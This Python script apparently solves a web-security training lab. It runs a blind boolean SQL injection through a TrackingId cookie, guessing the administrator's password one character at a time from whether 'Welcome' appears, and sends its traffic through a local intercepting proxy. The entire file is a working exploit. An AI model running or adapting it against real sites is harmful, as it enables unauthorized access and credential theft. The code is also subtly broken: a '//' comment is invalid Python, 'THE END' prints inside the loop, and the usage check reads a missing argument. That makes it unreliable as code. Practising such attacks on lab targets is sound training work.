import requests
import sys
import urllib3
import urllib
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def sqli_password(url):
	password_extracted=""
	for i in range(1,21):
		for j in range(32,126):
			// sqli_payload = "'|| (SELECT CASE WHEN SUBSTR(password, 1, 2)='ab' THEN TO_CHAR(1/0) ELSE 'a' END FROM users where username = 'administrator')--
			sqli_payload = "' AND (SELECT substring(password,%s,1) from users where username = 'administrator') = '%s'--" %(i,chr(j))
			sqli_payload_encoded = urllib.parse.quote(sqli_payload)
			cookies = {"TrackingId": "VWCnkmLEiP9EYoJF" + sqli_payload_encoded, "session": "33zPO4hnkQ3p0yrRZV5mtsCmwyCREq1E"}
			r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
			if "Welcome" not in r.text:
				sys.stdout.write('\r' + password_extracted + chr(j))
				sys.stdout.flush()
			else:
				password_extracted += chr(j)
				sys.stdout.write('\r' + password_extracted)
				sys.stdout.flush()
				break
		print("THE END")

def main():
	if len(sys.argv) != 2:
		print("(-) usage %s <url>" % sys.argv[0])
		print("(-) Example: %s www.example.com" % sys.argv[1])

	url = sys.argv[1]
	print("(+) Retrieving administrator password")
	sqli_password(url)
	
	
if __name__ == "__main__":
	main()